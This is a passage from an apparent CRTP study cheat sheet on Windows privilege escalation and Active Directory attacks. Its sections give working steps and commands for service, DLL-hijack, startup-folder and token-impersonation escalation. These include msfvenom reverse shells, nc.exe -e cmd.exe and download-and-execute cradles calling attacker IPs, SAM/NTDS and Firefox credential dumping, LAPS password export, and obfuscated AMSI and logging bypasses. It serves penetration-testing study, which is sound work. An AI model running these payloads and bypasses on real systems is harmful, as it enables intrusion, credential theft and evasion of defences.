-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
4. compile the C file
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
5. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc 

# <span style="color:lightblue">Startup Applications</span>

## <span style="color:lightgreen">Methodology</span>

Startup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start:
+ Run registry keys (HKLM, HKCU, wow64 nodes included)
+ RunOnce registry keys
+ Startup folders under the start menu for per user and public locations

So basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. Open the command prompt and type the following to check the permission. Path is static: 
```console
C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/12f85b86-6240-4ec0-add1-168afce6b7e7)

you also can use accesschk to check the permission

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6ed4ab5-2b46-47ab-8472-375e8387a561)


2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o y.exe
```
3. Copy the generated file, `y.exe`, to the Windows VM.

### Windows VM

1. Place `y.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`.

2. logout and login again
### Kali VM

1. Wait for a reverse shell on your kali machine. [Reference](https://3alam.pro/redvirus/articles/privilege-escalation-startup-programs)

# <span style="color:lightblue">Port Forwarding</span>

## <span style="color:lightgreen">Methodology</span>
Let us first understand what Port Forwarding is. Sometimes, after you hack the device, there are internal ports. These internal ports may be infected with a specific vulnerability and operate with high powers, or you may benefit from them in general by increasing permissions.

## <span style="color:lightgreen">Detection</span>
When I did nmap scan on the machine. we didn't get either SMB nor RDP 
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bea0a5de-6c5d-4c0a-9f59-a71b21351eab)

1. run winPEASE and look for clear credentials in the registry; if you already have ignore the this step
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ca9fb58c-1cb9-44c1-9af7-148665edbbdc)

2. check the internal open ports in the machine using `"netstate -ano"`. port 445 is locally opened so you need to check what is there. use ssh with [plink.exe](https://github.com/fwbuilder/w32-bin/blob/master/plink.exe)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/64ca3155-5c20-4c3f-b8f4-47f0232620e1)

## <span style="color:lightgreen">Exploitation</span>

1.  install ssh and edit the config file (kali)
```
apt install ssh && nano /etc/ssh/sshd_config
```
2.  change #PermitRootLogin line in the sshd_config file to the following
```
PermitRootLogin yes
service ssh restart && service ssh enable
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9cbb48fa-f75d-4e43-8d08-61d8c1233746)

3.  transfer plink tool to the Windows machine and run the following command
```
plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
#OR
plink.exe <kaliUser>@<kaliIP> -R <SMBserviceinWindows port 445>:127.0.0.1:<OpenPortInKali>
```
4. run `"netstat -tlp"` on kali to ensure that new port was opened in kali machine
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/16d7e702-43ad-4df4-b91e-7730b80bf267)

5.  now you need to use winexe tool to execute a command in Windows
-     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
#OR

6. You also can get an elevated shell using [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
```
psexec.py admin:password123@127.0.0.1 cmd  #creds that you found in registry using winPEASE
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a224b657-ddd6-4631-8f6b-e295413f9ee3)

# <span style="color:lightblue">Windows Subsystem for Linux</span>

## <span style="color:lightgreen">Methodology</span>
you can think about it as VM in Windows machine. if besh.exe and wsl.exe are installed you are good to go

## <span style="color:lightgreen">Detection</span>
check if bash.exe and wsl.exe are installed
-     where /R c:\windows bash.exe

## <span style="color:lightgreen">Exploitation</span>
run either bash.exe or wsl.exe to get a shell then use python tty escape to get a shell
```
C:\>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
python -c 'import pty; pty.spawn("/bin/bash")'
```
now you are running linux machine. you can use linux commands and continue enumeration

# <span style="color:lightblue">DLL Hijacking</span>

## <span style="color:lightgreen">Methodology</span>
Check DLL Hijacking from hacktricks FYR.

Some servers rely on DLL files at the time, but if the DLL file that the server relies on is deleted, Windows will search it in several paths:

-   The directory from which the application is loaded
-   `C:\Windows\System32`
-   `C:\Windows\System`
-   `C:\Users\AllUsers\AppData\Local\Microsoft\WindowsApps`
-   `C:\Temp`
-   `C:\Windows`

We assume that if we have write permission on one of these paths, and we also know that the service relies on dll files, we will create a malicious file with the extension dll and the same name as the file that the service is searching for.

But unfortunately, it is difficult to know whether this service depends on DLL or not except through the Process Monitor program, and this program requires high permissions.

## <span style="color:lightgreen">Detection</span>

###  Windows VM (RDP is required)
1. Transfer [Procmon.exe](https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html) on the Windows VM
2. Right click on `Procmon.exe` and select `'Run as administrator'` from the menu.
3. In procmon, select `"filter"`.  From the left-most drop down menu, select `'Process Name'`.
4. In the input box on the same line type: `dllhijackservice.exe`
5. Make sure the line reads “Process Name is `dllhijackservice.exe` then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.
6. Next, select from the left-most drop down menu `'Result'`.
7. In the input box on the same line type: `NAME NOT FOUND`.
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/68c1f9b7-3c68-47b8-bf39-40b61e4190ad)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b5d988cc-d12f-4aa3-975d-684357add0d8)


9. Open command prompt and type: 
```console
C:\Temp> sc start dllsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/489d87f3-c022-477d-b4c8-1596cf36536e)


10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7e158da5-450c-47b4-addb-f7b6a9abe453)

### Using winPEASE

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/edfadeb7-59ef-446c-b63e-80d765ffe18d)

We note that we have write permission on the Temp folder, and we mentioned previously that the Temp folder is one of the folders in which DLL files are searched.

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ad03f19f-69f6-46d5-a88f-ae7de4c90aae)

This service is vulnerable to DLL Hijacking

check if I can start & stop the service using accesschk
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8802a456-895d-4b13-80b8-bc9aed0b8ab2)

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
```
The name of the malicious file must be the same as the name of the file that the server is searching for
Ok, how did you know that the name is hijackme also through the Process Monitor program, and this program requires high permissions

3. Copy the generated file `hijackme.dll`, to the Windows VM.

### Windows VM

1. Place `hijackme.dll` in` 'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> sc stop dllsvc & sc start dllsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">BinPath</span>

## <span style="color:lightgreen">Methodology</span>

BinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.

## <span style="color:lightgreen">Detection</span>

### Using Script on Windows VM

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service permissions field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/aff13a5b-82aa-486b-b7ed-8b23ca523762)

continue enumeration to check if you can change the path of the service

### Checking manually on Windows VM

1. Run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```console
C:\Temp> accesschk64.exe -uwcv Everyone *

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
# c --> displays service name of the following
# Everyone --> means everyone as a group who hass access
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/732f0827-ca4d-4abe-8c76-bd679036255a)

we got the same service again from manual enumeration

2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
```console
C:\Temp> accesschk64.exe -uwcv daclsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5513d357-9577-4051-bdbd-21e04207f7e4)

we can start & stop the service.

3. Find the BINARY_PATH_NAME
```console
C:\Temp> sc qc daclsvc
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d611d97c-fc41-4442-8ac5-68cc8f37c35e)


##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o reverse.exe
```
3. Copy the generated file `reverse.exe`, to the Windows VM.

### Windows VM

1. Place `reverse.exe` in` 'C:\Temp'`
2. In command prompt type: 
```console
C:\Temp> sc config daclsvc binpath= "C:\Temp\reverse.exe"
```
3. In command prompt type: 
```console
C:\Temp> sc start daclsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### If you can't transfer the payload to windows (AV is blocking) use the following exploit in the BinPath
-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
# <span style="color:lightblue">Unquoted Service Paths</span>

## <span style="color:lightgreen">Methodology</span>

When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege).

In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the unquoted service field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/54c3e5a4-cc2c-4627-bb7e-fb1b5540a042)

2. use accesschk tool to check if you can stop & start the service
```
accesschk.exe /accepteula -ucqv unquotedsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d0f86e09-5009-4cd6-bfb2-4621c844353d)

3. check each folder before the service path starting from the root if you have read or write permission
```
accesschk.exe /accepteula -uwdq FolderPath
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/457a182b-312e-4fe1-97f7-4345eff8b0f6)

as you can see you don't have read or write permission in C folder. check the next folder

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/db03daaa-2404-4818-808b-2021f8b08411)

in `"Unquoted Path Service"` folder we have read & write permission so you can put your payload here. your payload name should be exactly the same name of the next folder

for example your path is `"C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe"` and you have read & write permission in `"Unquoted Path Service"` folder your payload should be Common.exe

##  <span style="color:lightgreen">Exploitation</span>
### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o common.exe
```
3. Transfer the generated file, `common.exe`, to the Windows VM.

### Windows VM

1. Place `common.exe` in `'C:\Program Files\Unquoted Path Service'`.
2. Open command prompt and type: 
```console
C:\Temp> sc start unquotedsvc
# OR
C:\Temp> net start unquotedsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Juicy potato attack</span>

## <span style="color:lightgreen">Methodology</span>

This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\SYSTEM. 

## <span style="color:lightgreen">Detection</span>


### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp>whoami /priv
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34cc6333-eed0-4a6e-9c1e-1b71acb87944)


##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Copy `Invoke-PowerShellTcp.ps1` from [nishang](https://github.com/samratashok/nishang/tree/master/Shells) shells as `shell.ps1`
2. Add the line at the bottom of `shell.ps1`
```console
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 -Port 9999
```

3. Lets create a `shell.bat` file
```console
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.31/shell.ps1')
```

4. Transfer `shell.bat` and `juicypotato.exe` on victim machine
```console
$ (new-object net.webclient).downloadfile('http://10.10.14.31/file', 'C:\temp\file')
```

5. Set a listener on port 9999
```console
$ sudo rlwrap nc -lnvp 9999
```

### Windows VM

+ Use CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
+ Link --> [http://ohpe.it/juicy-potato/CLSID](http://ohpe.it/juicy-potato/CLSID)

2. run juicy potato
```console
$ ./jp.exe -p shell.bat -l 7777 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
#OR
JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
#OR
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine}
#OR
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### Use Juicy Potato by setting up your SMB server if the antivirus is on
```
impacket-smbserver raman `pwd` #set up SMB server
cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
```

### JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809. use PrintSpoofer instead.
```
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
```

# <span style="color:lightblue">Hot Potato attack</span>

## <span style="color:lightgreen">Methodology</span>

Hot Potato takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp> whoami /priv
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/07560756-a313-4826-b33a-78f1e51765d9)


##  <span style="color:lightgreen">Exploitation</span>

I will be demonstrating a simple exploitation technique by adding a user to the local administrators group using [Tater.ps1](https://github.com/Kevin-Robertson/Tater/blob/master/Tater.ps1)

### Windows VM

1. Enter the following to gain administrator access
```console
C:\Temp> powershell.exe -nop -ep bypass
PS C:\Temp> Import-Module C:\Temp\Tater.ps1
PS C:\Temp> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

# <span style="color:lightblue">Kernel Exploits</span>

## <span style="color:lightgreen">Searcing exploits</span>

This method is handy for checking any existing exploits available for the machine by looking at the system information.
From the results of [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py) we can select one of the kernel exploits and try to escalate privileges.

### Windows VM

1. Run systeminfo and save it into a text file

```console
C:\Temp> systeminfo
```

### Kali VM

1. Pass the file thorugh [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

```console
$ ./windows-exploit-suggester.py --update

[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2020-06-06-mssb.xlsx
[*] done

$ ./windows-exploit-suggester.py --database 2020-06-06-mssb.xlsx --systeminfo systeminfo.txt 

Exploits will be displayed here...
```

# <span style="color:lightblue">Password Mining Escalation - Firefox</span>

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Path location :
```console
C:\Temp> C:\Users\usernamehere\AppData\Roaming\Mozilla\Firefox\Profiles
```

## Requirements
Copy the following files from the Windows VM to Kali VM:
1. key4.db
2. logins.json
3. addons.json
4. cert9.db

## <span style="color:lightgreen">Exploitation</span>
1. Download the following
```console
$ git clone https://github.com/lclevy/firepwd.git
```

2. Place the required files in the same directory and run the python file for the creds

```console
$ python3 firepwd.py
 
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
<SNIP>
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'<<HIDDEN>>'
```

# <span style="color:lightblue">Backup</span>
## <span style="color:lightgreen">Methodology</span>
sometimes the administrator makes a backup file of the SAM & SYSTEM. often these files are stored in the `"C:\Windows\Repair"` OR `"C:\Windows\System32\config\RegBack"`

## <span style="color:lightgreen">Detection</span>
1. Run winPEAS and check for the backup files
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c6d0d49-fca0-434f-8012-e10ec75c5db6) you got the SAM & SYSTEM files

## <span style="color:lightgreen">Exploitation</span>
1. use pwdump tool to dump the password of all users
-     python3 pwdump.py SYSTEM SAM


# <span style="color:lightblue">Runas-Savdcreds</span>
## <span style="color:lightgreen">Methodology</span>
We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Checking for existence

```console
$ cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/759d48ae-2904-4a72-81f6-7a55690de02c)

## <span style="color:lightgreen">Exploitation</span>
1. Reading root flag
```console
C:\Temp> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE c:\Users\Administrator\Desktop\root.txt > C:\Users\security\root1.txt"
```

2. getting a reverse shell
use masfvenom 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
```
start the listener
```
nc -nlvp
```
runas exploit
```
runas /savecred /user:admin C:\Temp\program.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/609e3011-2b5a-427f-92e3-15399306979b)


# <span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span>

## <span style="color:lightgreen">Methodology</span>

If the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.

## <span style="color:lightgreen">Detection</span>

1. The user should be a part of the Backup Operators group and should have  SeBackupPrivilege and SeRestorePrivilege Enabled

```console
C:\Temp> net user unsername-here
C:\Temp> whoami /all
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Create this script and transfer it to Windows VM

```powershell
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

### Windows VM

1. Pass the script to **diskshadow unility** to create the shadow copy
```powershell
PS C:\Temp> diskshadow /s script.txt
```
2. Now copy the NTDS file using **_Robocopy_** to the Temp file we created in the C: drive
```powershell
PS C:\Temp> robocopy /b E:\Windows\ntds . ntds.dit
```
3. Next we get the system registry hive that contains the key needed to decrypt the NTDS file with **_reg save_** command.
```powershell
PS C:\Temp> reg save hklm\system c:\temp\system.hive
```

### Dumping NTML Hashes

1. We can use `secretsdump.py` do decrypt the DA creds on Kali VM

```console
$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash-dump
```

# <span style="color:lightblue">Scheduled Tasks</span>
Windows has the ability to schedule tasks, meaning it is possible to execute a command or script on the system at a specific time or at a simultaneous time, for example, every five minutes, etc. you need to manually search for these files.
## <span style="color:lightgreen">Detection</span>
after manual enumeration. I found a file called CleanUp.ps1 in C:\DevTools. check the content of the file 

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7064bea2-0762-411e-a68a-046af6d8f932)

there is a comment that says script will clean up all your old dev logs every minute and this file will run with SYSTEM privilege which is the highest privilege

## <span style="color:lightgreen">Exploitation</span>
1. Before exploitation check if you can write inside the file using accesschk

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/0610c463-aa5b-4e5a-8d95-4062cd9e72e9)

we have the write permission so we will contact our malicious file within the file

2. use msfvenom to generate a file

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8c895b02-46dd-4446-a0cd-36a1e86abcad)

3. run nc to get a shell

# <span style="color:lightblue">Abusing GPO permissions</span>

## <span style="color:lightgreen">Exploitation</span>
We Abusing GPO by adding the user to the local Administrators group leveraging a tool called SharpGPOAbuse.

Source : [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

Pre compiled binaries : [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

+ Add user to local administrator groups

```powershell
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

+ Force Update the system

```powershell
PS C:\Enterprise-Share> gpupdate /force
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

+ Now review our group memberships after we forced the policies to be updated on the target machine.

```powershell
PS C:\Enterprise-Share> net user enterprise-security
# Will be added to the administrators group
```

# <span style="color:lightblue">Export LAPS Passwords</span>

## <span style="color:lightgreen">Methodology</span>
The following script assumes that LAPS has already been configured into your environment & that your user account already has access to view LAPS passwords using the Fat Client UI or from Active Directory Users & Computers.

This script loads the Active Directory module, finds the LAPS password fields, and then saves them to a CSV with the date appended to the file name. The only thing you’d need to change is the file path.

## <span style="color:lightgreen">Exploitation</span>

1. Just Open Powershell and paste this script
```powershell
$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$computers | Export-Csv -path c:\temp\"LAPS-$((Get-Date).ToString("MM-dd-yyyy")).csv" -NoTypeInformation
```

2. Then, save it to the location of your choice. For this example, I’m saving to
```console
C:\Scripts\LAPSexport.ps1
```

3. Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.

# <span style="color:lightblue">Common for the course</span>
## <span style="color:lightgreen">Exploitation</span>
1. Load PowerUp.ps1 and run `"Invoke-AllChecks"`
2. focus on the AbuseFunction
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/986a5c8b-a827-43ca-9ce5-0ec5462f435c)
3. check how you can abuse the service
```
help Invoke-ServiceAbuse -Examples
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3eafb7ba-670e-4696-949f-a62a92aede26)

4. you will get a lot of examples. choose the best. it will return a command that ran to abuse the service
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\student1 -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b4eaa773-093a-4c22-9ab3-a2968993cf66)

5. check the Administrator group
```
net localgroup Administrators
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f26431e6-a234-48d2-a258-8256756a3031)

your user will be added to the administrator group. just refresh the Windows machine by logoff and login again.
6. run `"cmd"` as administrator



# Local Administrator User
1. After privilege escalation check if the current user is a local admin on another machine
```
. .C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/329c2b09-0d58-4a0b-985f-687e0b5c0ff3)
if you have admin access use winrs to connect to the machine
```
winrs -r:dcorp-adminsrv cmd
```



# BloodHound Enumeration   Need Admin Privs
### Start BloodHound
Start neo4j and BloodHound UI on kali machine and load the zip/json files
```
sudo neo4j console  (credentials neo4j:to0or) | ulimit -n 100000  (if the service didn't work. Warning: max 1024 open files..)  #Get the local address from here
sudo bloodhound   (credentials neo4j:to0or)
```
### Data Collection 
1. Run Invisi-Shell
```
RunWithRegistryNonAdmin.bat
```
2. Bypass .NET AMSI using below code in PowerShell before running SharpHound
```
$ZQCUW = @" 
using System; 
using System.Runtime.InteropServices; 
public class ZQCUW { 
    [DllImport("kernel32")] 
    public static extern IntPtr GetProcAddress(IntPtr hModule, string 
procName); 
    [DllImport("kernel32")] 
    public static extern IntPtr LoadLibrary(string name); 
    [DllImport("kernel32")] 
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr 
dwSize, uint flNewProtect, out uint lpflOldProtect); 
} 
"@ 
 
Add-Type $ZQCUW 
 
$BBWHVWQ = 
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
 ;&#105;&#46;&#100;&#108;&#108;'))") 
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, 
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
 ;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))") 
$p = 0 
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) 
$TLML = "0xB8" 
$PURX = "0x57" 
$YNWL = "0x00" 
$RTGX = "0x07" 
$XVON = "0x80" 
$WRUD = "0xC3" 
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD) 
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```
3. Run SharpHound (Investorer)
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
#OR
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
4. Upload the data to Bloodhound

To avoid detections like MDI
```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
To avoid detections use Stealth
```
Invoke-BloodHound -Stealth
SharpHound.exe --stealth
```


# Learing Objective 7
# Abusing Admin Sessions then extract the credentials using SafetyKatz
### Using access to dcorp-ci
1. open a new cmd and bypass Enhanced Script Block Logging
```
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```
2. Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),' s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
3. Download and execute PowerView in memory
```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```
4. Enumerate Admin Sessions
```
Find-DomainUserLocation
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/29ec214d-99b5-431c-8971-29cce5b858d5)

5. Abuse using winrs
```
winrs -r:dcorp-mgmt hostname;whoami
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/362b9a23-69af-4b62-860e-9e5cbd1f714b)

6. Download Loader.exe on the current machine then copy it to the new machine that has a session
